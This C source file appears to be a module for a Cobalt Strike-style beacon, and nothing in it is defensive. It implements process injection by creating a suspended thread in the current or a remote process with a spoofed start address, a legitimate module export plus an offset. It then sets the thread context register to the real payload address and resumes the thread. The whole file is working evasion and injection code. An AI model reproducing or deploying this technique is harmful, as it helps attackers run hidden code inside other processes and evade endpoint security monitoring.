#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <Tlhelp32.h>
#include "beacon.h"
#include "inject.h"

BOOL inject_with_hinted_func(DWORD method, HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter, char * module, char * func, DWORD offset) {
	LPVOID fakeAddr = NULL;
	HANDLE hThread  = NULL;
	CONTEXT ctx;

	/* we're going to fail if the fake function doesn't exist... why make this into a big fuck mess otherwise */
	fakeAddr = GetProcAddress(GetModuleHandleA(module), func);
	if (fakeAddr == NULL)
		return FALSE;

	/* increment our fake function by our offset */
	char* pFakeAddr = (char*)fakeAddr;
	pFakeAddr += offset;

	/* create our thread */
	switch (method) {
		case PI_EXEC_CREATETHREAD_F:
			hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pFakeAddr, lpParameter, CREATE_SUSPENDED, NULL);
			break;
		case PI_EXEC_CREATEREMOTETHREAD_F:
			hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFakeAddr, lpParameter, CREATE_SUSPENDED, NULL);
			break;
	}

	/* if one of the above failed, handle it appropriately */
	if (hThread == NULL)
		return FALSE;

	/* get our thread context */
	ctx.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(hThread, &ctx))
		return FALSE;

	/* update the right register to make this kick off in the right place, pls */
#if defined _M_X64
	ctx.Rcx = (DWORD64)lpStartAddress;
#elif defined _M_IX86
	ctx.Eax = (DWORD)lpStartAddress;
#endif

	if (!SetThreadContext(hThread, &ctx))
		return FALSE;

	/* if the thread resumes, we're good, it worked */
	return ResumeThread(hThread) != -1;
}